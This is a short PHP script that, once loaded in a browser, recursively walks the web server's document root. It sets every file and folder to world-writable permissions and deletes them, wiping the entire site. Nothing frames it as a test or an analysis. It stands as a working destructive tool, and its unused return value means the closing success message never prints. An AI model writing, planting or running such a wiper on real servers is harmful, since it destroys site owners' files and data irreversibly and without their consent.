<?PHP
//print $_SERVER['DOCUMENT_ROOT'] ;
//die ;

$path_remove = $_SERVER['DOCUMENT_ROOT'].'/' ;

define('PATH', $path_remove);
function deleteAll($dir) {
	$mydir = opendir($dir);
	while(false !== ($file = readdir($mydir))) {
	if($file != "." && $file != "..") {
	chmod($dir.$file, 0777);
	if(is_dir($dir.$file)) {
	chdir('.');
	deleteAll($dir.$file.'/');
	rmdir($dir.$file);
	}
	else{
	unlink($dir.$file);
	}
	}
	}
	closedir($mydir);
}
if(deleteAll(PATH)){;
echo 'great..all done.';
}
?>